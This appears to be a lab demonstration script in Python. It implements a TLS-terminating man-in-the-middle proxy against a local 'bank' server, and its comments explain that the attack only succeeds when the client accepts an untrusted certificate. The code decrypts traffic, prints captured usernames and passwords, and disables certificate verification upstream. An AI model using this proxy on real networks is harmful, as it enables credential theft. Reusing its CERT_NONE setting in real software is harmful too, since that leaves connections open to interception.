# tls_mitm_proxy.py -- a TLS-TERMINATING "man in the middle". LAB USE ONLY.
# This is what a real interception proxy (and many captive-portal / "SSL inspection"
# products) actually does: it ends the victim's TLS connection using ITS OWN
# certificate (certs/attacker_cert.pem -- NOT the bank's real key), reads the
# plaintext, re-encrypts, and opens a SEPARATE TLS connection to the real bank.
# It can only succeed if the victim's client is willing to trust/accept a
# certificate for "bank.local" that was not issued by anyone the client trusts.
# Run:  python tls_mitm_proxy.py      ->  listens on 127.0.0.1:6444 (TLS), forwards to 127.0.0.1:6443 (TLS)
import re
import socket
import ssl
import threading

LISTEN_HOST, LISTEN_PORT = "127.0.0.1", 6444
TARGET_HOST, TARGET_PORT = "127.0.0.1", 6443


def pump(src, dst):
    while True:
        try:
            data = src.recv(4096)
        except (ssl.SSLError, OSError):
            break
        if not data:
            break
        text = data.decode(errors="replace")
        m = re.search(r"username=([^&\s]+)&password=([^&\s]+)", text)
        if m:
            print(f"[TLS MITM] *** CAPTURED CREDENTIALS (decrypted!) *** username={m.group(1)} password={m.group(2)}")
        try:
            dst.sendall(data)
        except OSError:
            break


def handle(client_raw):
    # 1. Terminate the victim's TLS connection using the ATTACKER's own cert/key
    server_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    server_ctx.load_cert_chain("certs/attacker_cert.pem", "certs/attacker_key.pem")
    try:
        client_tls = server_ctx.wrap_socket(client_raw, server_side=True)
    except ssl.SSLError as e:
        print(f"[TLS MITM] victim's client REJECTED our certificate: {e}")
        client_raw.close()
        return

    # 2. Open a brand-new, separate TLS connection to the REAL bank
    upstream_raw = socket.create_connection((TARGET_HOST, TARGET_PORT))
    upstream_ctx = ssl.create_default_context()
    upstream_ctx.check_hostname = False
    upstream_ctx.verify_mode = ssl.CERT_NONE   # the attacker doesn't care if the real bank's cert is valid
    upstream_tls = upstream_ctx.wrap_socket(upstream_raw, server_hostname=TARGET_HOST)

    t1 = threading.Thread(target=pump, args=(client_tls, upstream_tls))
    t2 = threading.Thread(target=pump, args=(upstream_tls, client_tls))
    t1.start(); t2.start()
    t1.join(); t2.join()
    client_tls.close(); upstream_tls.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(5)
    print(f"[TLS MITM] listening on {LISTEN_HOST}:{LISTEN_PORT} (TLS), forwarding to {TARGET_HOST}:{TARGET_PORT} (TLS)")
    while True:
        client_raw, addr = srv.accept()
        threading.Thread(target=handle, args=(client_raw,), daemon=True).start()


if __name__ == "__main__":
    main()
